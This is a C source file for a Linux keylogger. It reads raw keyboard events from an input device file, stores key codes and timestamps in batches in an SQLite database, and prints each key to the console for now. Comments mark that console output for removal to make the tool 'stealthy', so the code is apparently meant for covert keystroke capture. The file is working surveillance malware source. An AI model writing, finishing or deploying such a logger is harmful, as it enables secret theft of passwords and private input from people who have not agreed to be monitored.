#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sqlite3.h>
#include <linux/input.h>

#include "cnslib.h"
#include "db.h"

#define BUFFER_SIZE 150

// in memory buffer
struct KeyEvent buffer[BUFFER_SIZE];
int buffer_count = 0;

// db refernce
sqlite3 *db = NULL;

const char *getKeyEventString(struct input_event ie); // returns event (KeyDown, keyUp, keyRepeat) along with key code as string

void handleKeyStroke(struct input_event ie); // populates the keystroke info

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <event-file-path>\n", argv[0]);
        exit(-1);
    }

    // opening keyboard file
    int fd = open(argv[1], O_RDONLY, 0);

    if (sqlite3_open("events.db", &db) != SQLITE_OK)
    {
        fprintf(stderr, "Cannot open database: %s\n",
                sqlite3_errmsg(db));

        sqlite3_close(db);
        return EXIT_FAILURE;
    }

    struct input_event ie;

    while (1)
    {
        ssize_t n = read(fd, &ie, sizeof(ie));

        if (n == -1)
        {
            perror("read");
            break;
        }

        if (n != sizeof(ie))
        {
            fprintf(stderr, "Incomplete input_event read\n");
            break;
        }

        handleKeyStroke(ie);
    }

    sqlite3_close(db);

    return 0;
}

// populates the keystroke info
void handleKeyStroke(struct input_event ie)
{
    if (ie.type == EV_KEY)
    {
        buffer[buffer_count].tv_sec = ie.time.tv_sec;
        buffer[buffer_count].tv_usec = ie.time.tv_usec;
        buffer[buffer_count].code = ie.code;
        buffer[buffer_count].value = ie.value;

        buffer_count++;

        if (buffer_count >= BUFFER_SIZE)
        {
            if (insertBatch(db, buffer, buffer_count) == 0)
            {
                printf("Successfully inserted %d events in DB\n", buffer_count);
                buffer_count = 0;
            }
            else
            {
                printf("Database insertion failed\n");
            }
        }

        // output console purpose
        // TODO: remove this completely (stealthy)
        const char *event = getKeyEventString(ie);

        if (event != NULL)
        {
            printf("%d. [%ld.%06ld] %s\n",
                   buffer_count,
                   (long)ie.time.tv_sec,
                   (long)ie.time.tv_usec,
                   event);
        }
    }
}

// returns event (KeyDown, keyUp, keyRepeat) along with key code as string
// Only needed to print to the terminal
// TODO: Remove fxn (Stealth)
const char *getKeyEventString(struct input_event ie)
{
    if (ie.type != EV_KEY)
        return NULL;

    static char event[32];

    if (ie.value == 1)
        snprintf(event, sizeof(event), "KEY_%u_DOWN", ie.code);
    else if (ie.value == 0)
        snprintf(event, sizeof(event), "KEY_%u_UP", ie.code);
    else if (ie.value == 2)
        snprintf(event, sizeof(event), "KEY_%u_REPEAT", ie.code);
    else
        return NULL;

    return event;
}
